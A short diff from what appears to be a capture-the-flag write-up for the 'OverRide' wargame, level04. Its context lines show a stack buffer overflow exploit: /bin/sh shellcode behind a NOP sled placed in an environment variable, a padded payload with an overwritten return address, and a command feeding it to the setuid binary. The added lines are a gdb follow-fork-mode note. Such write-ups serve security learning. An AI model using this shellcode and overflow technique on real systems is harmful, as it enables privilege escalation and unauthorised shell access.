@@ -31,3 +31,10 @@ export SHELLCODE=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x
 level04@OverRide:~$ python -c 'print "A"*156 + "\xff\xff\xd7\x90"[::-1]' > /tmp/pyload
 
 level04@OverRide:~$ (cat /tmp/pyload ; cat ) | /home/users/level04/level04
+
+
+
+# notes:
+
+# set follow fork mode
++ set follow-fork-mode child/parent
